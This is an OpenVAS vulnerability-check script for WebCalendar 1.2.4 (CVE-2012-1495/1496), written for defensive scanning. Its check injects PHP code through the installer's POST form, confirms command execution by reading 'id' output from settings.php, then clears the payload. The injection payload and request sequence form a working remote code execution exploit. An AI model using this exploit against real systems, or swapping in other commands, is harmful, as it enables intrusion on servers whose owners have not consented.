###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_WebCalendar_53207.nasl 11651 2018-09-27 11:53:00Z asteins $
#
# WebCalendar Local File Include and PHP code Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103476");
  script_bugtraq_id(53207);
  script_cve_id("CVE-2012-1495", "CVE-2012-1496");
  script_version("$Revision: 11651 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("WebCalendar Local File Include and PHP code Injection Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53207");
  script_xref(name:"URL", value:"http://sourceforge.net/projects/webcalendar/?source=directory");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/522460");

  script_tag(name:"last_modification", value:"$Date: 2018-09-27 13:53:00 +0200 (Thu, 27 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-04-25 09:40:31 +0200 (Wed, 25 Apr 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_tag(name:"solution_type", value:"VendorFix");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("webcalendar_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("webcalendar/installed");
  script_tag(name:"solution", value:"Reports indicate vendor updates are available. Please contact the
vendor for more information.");
  script_tag(name:"summary", value:"WebCalendar is prone to multiple input-validation vulnerabilities
because it fails to properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker can exploit these issues to inject arbitrary PHP code and
include and execute arbitrary files from the vulnerable system in the
context of the affected application. Other attacks are also possible.");

  script_tag(name:"affected", value:"WebCalendar 1.2.4 is vulnerable, other versions may also be affected.");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("version_func.inc");

CPE = 'cpe:/a:webcalendar:webcalendar';

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

phpcode = '*/print(____);passthru(id);die;';
payload = 'app_settings=1&form_user_inc=user.php&form_single_user_login=' + phpcode;

req = string("POST ", dir, "/install/index.php HTTP/1.1\r\n",
             "Host: ", get_host_name(),"\r\n",
             "Content-Length: ", strlen(payload),"\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Connection: close\r\n\r\n",payload);

res = http_send_recv(port:port, data:req);

if("HTTP/1.1 200" >!< res)exit(99);

url = dir + '/includes/settings.php';

if(http_vuln_check(port:port,url:url,pattern:"uid=[0-9]+.*gid=[0-9]+.*")) {

# remove the payload from settings.php
  payload = 'app_settings=1&form_user_inc=user.php&form_single_user_login=';
  req = string("POST ", dir, "/install/index.php HTTP/1.1\r\n",
             "Host: ", get_host_name(),"\r\n",
             "Content-Length: ", strlen(payload),"\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Connection: close\r\n\r\n",payload);

  res = http_send_recv(port:port, data:req);

  security_message(port:port);
  exit(0);

}

exit(99);
